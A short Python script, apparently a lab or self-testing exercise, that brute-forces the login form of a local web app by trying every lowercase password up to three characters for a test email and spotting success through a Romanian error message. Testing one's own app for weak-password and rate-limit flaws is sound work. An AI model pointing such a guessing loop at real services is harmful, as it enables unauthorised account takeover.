import requests
import itertools
import string

BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/login"
TEST_EMAIL = "test@test.com"

def brute_force_login(max_length=3):
    alphabet = string.ascii_lowercase

    for length in range(1, max_length + 1):
        for combination in itertools.product(alphabet, repeat=length):
            test_password = "".join(combination)
            payload = {
                "email": TEST_EMAIL,
                "password": test_password
            }

            try:
                response = requests.post(LOGIN_URL, data=payload)

                if "Parola invalida." not in response.text:
                    print(f"Correct password: {test_password}")
                    return

            except requests.exceptions.ConnectionError:
                print("Server error.")
                return

    print("Couldn't find the password.")


brute_force_login(max_length=3)
